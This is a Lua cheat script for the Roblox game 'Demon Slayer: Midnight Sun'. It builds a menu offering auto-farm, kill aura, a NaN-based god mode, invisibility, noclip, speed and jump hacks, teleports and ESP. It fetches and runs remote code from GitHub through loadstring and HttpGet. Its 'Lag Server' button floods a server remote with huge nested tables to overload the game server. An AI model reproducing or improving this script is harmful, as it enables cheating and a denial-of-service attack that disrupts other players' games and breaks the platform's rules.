local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
local Settings = {}

local UI = Material.Load({
     Title = "Legend Handles | Demon Slayer: Midnight Sun",
     Style = 1,
     SizeX = 350,
     SizeY = 400,
     Theme = "Aqua"
})

getgenv().cham = false
getgenv().nameESP = false
getgenv().boxESP = false


getgenv().esp_loaded = false
getgenv().Visibility = false

	
	
local main = UI.New({Title = "Main-Features"})



local SelectMob = {}
for i,v in pairs(workspace.Live.Npcs:GetChildren()) do 
    if v:IsA("Model") and not table.find(SelectMob, v.Name) then 
        table.insert(SelectMob, v.Name)
    end
end


local SelectMob1 = {}
for i,v in pairs(workspace.EventZones:GetChildren()) do 
    if v:IsA("Part") and not table.find(SelectMob1, v.Name) then 
        table.insert(SelectMob1, v.Name)
    end
end

local SelectMob2 = {}
for i,v in pairs(workspace.AmbientAreas:GetChildren()) do 
    if v:IsA("Part") and not table.find(SelectMob2, v.Name) then 
        table.insert(SelectMob2, v.Name)
    end
end
main.Dropdown({
    Text = "Select NPC To Farm",
    Options = SelectMob,
    Callback = function(v)
        Settings["ChosenMob"] = v 
    end
})

main.Toggle({
    Text = "Auto Farm Mob",
    Enabled = false,
    Callback = function(v)
        Settings["Autofarm"] = v 
    end
})

main.Slider({
    Text = "Distance From Mob",
    Callback = function(v)
        Settings["Distance"] = v
    end,
    Min = -20,
    Max = 20,
    Def = 5
})

		
main.Toggle({
    Text = "Auto Finsh",
    Enabled = false,
    Callback = function(Value)
      a = Value
        while a do task.wait(4)
        pcall(function()
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "Grip"
}

game:GetService("Players").LocalPlayer.Character.Controller.RemoteEvent:FireServer(unpack(args))

        end)
        end
    end
})
	 
		
main.Toggle({
    Text = "Kill Aura (Only Old Nichirin)",
    Enabled = false,
    Callback = function(Value)
      a = Value
        while a do task.wait()
        pcall(function()
 local args = {
    [1] = "M1"
}

game:GetService("Players").LocalPlayer.Character["Old Nichirin"].RemoteEvent:FireServer(unpack(args))


local args = {
    [1] = "Hitbox",
    [2] = 1,
    [3] = "M1"
}

game:GetService("Players").LocalPlayer.Character["Old Nichirin"].RemoteEvent:FireServer(unpack(args))
        end)
        end
    end
})
	 


main.Toggle({
    Text = "Kill Aura (Only Nichirin)",
    Enabled = false,
    Callback = function(Value)
      a = Value
        while a do task.wait()
        pcall(function()
 local args = {
    [1] = "M1"
}

game:GetService("Players").LocalPlayer.Character["Nichirin"].RemoteEvent:FireServer(unpack(args))


local args = {
    [1] = "Hitbox",
    [2] = 1,
    [3] = "M1"
}

game:GetService("Players").LocalPlayer.Character["Nichirin"].RemoteEvent:FireServer(unpack(args))
        end)
        end
    end
})


	main.Button({
	Text = "GodMode",
		Callback = function()
		    game.Players.LocalPlayer.Character.Dash.RemoteEvent:FireServer("Falldmg", 0/0)
		    end})


	main.Button({
	Text = "Invisible",
		Callback = function()
		  local offset = 1100 --how far you are away from your camera when invisible
local LocalPlayer = game.Players.LocalPlayer
local Backpack = LocalPlayer.Backpack
local Character = LocalPlayer.Character
local invisible = false
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
   for _,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance end end
end
local tool = Instance.new("Tool", Backpack)
tool.Name = "Ghostify [Disabled]"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(function() wait()
   if not invisible then
       invisible = true
       tool.Name = "Ghostify [Enabled]"
       if handle then handle:Destroy() end if weld then weld:Destroy() end
       handle = Instance.new("Part", workspace) handle.Name = "Handle" handle.Transparency = 1 handle.CanCollide = false handle.Size = Vector3.new(2, 1, 1)
       weld = Instance.new("Weld", handle) weld.Part0 = handle weld.Part1 = Character.HumanoidRootPart weld.C0 = CFrame.new(0, offset-1.5, 0)
       setDisplayDistance(offset+100)
       workspace.CurrentCamera.CameraSubject = handle
       Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
       Character.Humanoid.HipHeight = offset
       Character.Humanoid:ChangeState(11)
       for _,child in pairs(Backpack:GetChildren()) do if child:IsA("Tool") and child ~= tool then grips[child] = child.Grip end end
   elseif invisible then
       invisible = false
       tool.Name = "Ghostify [Disabled]"
       if handle then handle:Destroy() end if weld then weld:Destroy() end
       for _,child in pairs(Character:GetChildren()) do if child:IsA("Tool") then child.Parent = Backpack end end
       for tool,grip in pairs(grips) do if tool then tool.Grip = grip end end
       heldTool = nil
       setDisplayDistance(100)
       workspace.CurrentCamera.CameraSubject = Character.Humanoid
       Character.Animate.Disabled = false
       Character.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
       Character.Humanoid.HipHeight = 0
       Character.Humanoid:ChangeState(11)
   end
   tool.Parent = Backpack
end)
Character.ChildAdded:Connect(function(child) wait()
   if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
       heldTool = child
       local lastGrip = heldTool.Grip
       if not grips[heldTool] then grips[heldTool] = lastGrip end
       for _,track in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do track:Stop() end
       Character.Animate.Disabled = true
       heldTool.Grip = heldTool.Grip*(CFrame.new(0, offset-1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
       heldTool.Parent = Backpack
       heldTool.Parent = Character
       if gripChanged then gripChanged:Disconnect() end
       gripChanged = heldTool:GetPropertyChangedSignal("Grip"):Connect(function() wait()
           if not invisible then gripChanged:Disconnect() end
           if heldTool.Grip ~= lastGrip then
               lastGrip = heldTool.Grip*(CFrame.new(0, offset-1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
               heldTool.Grip = lastGrip
               heldTool.Parent = Backpack
               heldTool.Parent = Character
           end
       end)
   end
end)
		    end})



	main.Button({
	Text = "Hide Name",
		Callback = function()
		    
		    end})


local t = UI.New({
    Title = "Teleports"
})

t.Dropdown({
    Text = "Teleport To EventZones",
    Options = SelectMob1,
    Callback = function(v)
        Settings["ChosenMob1"] = v 
    end
})

t.Toggle({
    Text = "Teleport",
    Enabled = false,
    Callback = function(v)
        Settings["Autofarm1"] = v 
    end
})

t.Dropdown({
    Text = "Teleport To AmbientAreas",
    Options = SelectMob2,
    Callback = function(v)
        Settings["ChosenMob2"] = v 
    end
})

t.Toggle({
    Text = "Teleport",
    Enabled = false,
    Callback = function(v)
        Settings["Autofarm2"] = v 
    end
})


local e = UI.New({
    Title = "Misc."
})

	e.Button({
	Text = "Noclip",
		Callback = function()
local Noclip = nil
local Clip = nil

function noclip()
	Clip = false
	local function Nocl()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
					v.CanCollide = false
				end
			end
		end
		wait(0.21) -- basic optimization
	end
	Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
end

function clip()
	if Noclip then Noclip:Disconnect() end
	Clip = true
end

noclip()
end})


e.Slider({
	Text = "WalkSpeed",
	Callback = function(s)
getgenv().WalkSpeedValue = (s); --set your desired walkspeed here
local Player = game:service'Players'.LocalPlayer;
Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
end)
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
	end,
	Min = 16,
	Max = 300,
	Def = 16
})



 e.Toggle({
	Text = "Infinite Jump",
	Callback = function(state)
 if state then
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
    else
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
            
	end,
	Enabled = false
})






	e.Button({
	Text = "(L) Lag Server",
		Callback = function()
		    getgenv().Toggled=false
getgenv().KeyBind="L"
getgenv().Delay=0.7
local UIS=game:GetService'UserInputService'

--//main

local function Source()
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val) 
   local mainvalueifonetable = 49999
   if type(val) ~= "number" then
       return nil 
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval 
end

local function bomb(tableincrease, tries) 
 local maintable = {}
 local spammedtable = {}
 
 table.insert(spammedtable, {})
 z = spammedtable[1]
 
 for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
 end 
 
 local calculatemax = getmaxvalue(tableincrease) 
 local maximum 
 
 if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 
 
  if calculatemax then
     maximum = calculatemax
     else
     maximum = 10000
 end
 
 for i = 1, maximum do
     table.insert(maintable, spammedtable)
 end 

 for i = 1, tries do
    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
 end
end


bomb(250, 5) --// change values if client crashes
end
UIS.InputBegan:Connect(function(Key)
    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
        if getgenv().Toggled then
            getgenv().Toggled=false
            warn'Disabled!'
        elseif not getgenv().Toggled then
            getgenv().Toggled=true
            warn'Enabled!'
            while getgenv().Toggled do
                Source()
                wait(getgenv().Delay)
            end
        end
    end
end)
		    
		    end})
 e.Toggle({
	Text = "Visual",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().Visibility = Value
            
	end,
	Enabled = false
})


 e.Toggle({
	Text = "Box ESP",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().boxESP = Value
		end,
	Enabled = false
})
 

 e.Toggle({
	Text = "Name ESP",
	Callback = function(Value)
 if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().nameESP = Value
		end,
	Enabled = false
})


e.Toggle({
	Text = "Chams",
	Callback = function(Value)
   if getgenv().esp_loaded == false and Value == true then
            getgenv().esp_loaded = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/skatbr/Roblox-Releases/main/A_simple_esp.lua", true))()
        end
        getgenv().cham = Value
		end,
	Enabled = false
})



-- // Credits \\ --
local cred = UI.New({
    Title = "Credits"
})

local creators = {
    "YT: Legend Handles",
}

for i,v in pairs(creators) do 
    cred.Button({
        Text = v,
        Callback = function()
            setclipboard(v) 
        end;
    });
end;



spawn(function()
    while wait() do 
        if Settings.Autofarm then 
            pcall(function()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then 
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) 
                end
                
                for i,v in pairs(workspace.Live.Npcs:GetChildren()) do
                    if v:IsA("Model") and v.Name == Settings.ChosenMob then 
                        repeat wait()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,Settings.Distance)


until not Settings.Autofarm or v:FindFirstChild("Humanoid").Health <= 0
                    end
                end
            end)
        end
    end
end)



spawn(function()
    while wait() do 
        if Settings.Autofarm1 then 
            pcall(function()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then 
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) 
                end
                
                for i,v in pairs(workspace.EventZones:GetChildren()) do
                    if v:IsA("Part") and v.Name == Settings.ChosenMob1 then 
                        repeat wait()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0,5,0)


until not Settings.Autofarm or v:FindFirstChild("Humanoid").Health <= 0
                    end
                end
            end)
        end
    end
end)



spawn(function()
    while wait() do 
        if Settings.Autofarm2 then 
            pcall(function()
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then 
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) 
                end
                
                for i,v in pairs(workspace.AmbientAreas:GetChildren()) do
                    if v:IsA("Part") and v.Name == Settings.ChosenMob2 then 
                        repeat wait()
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0,5,0)


until not Settings.Autofarm or v:FindFirstChild("Humanoid").Health <= 0
                    end
                end
            end)
        end
    end
end)
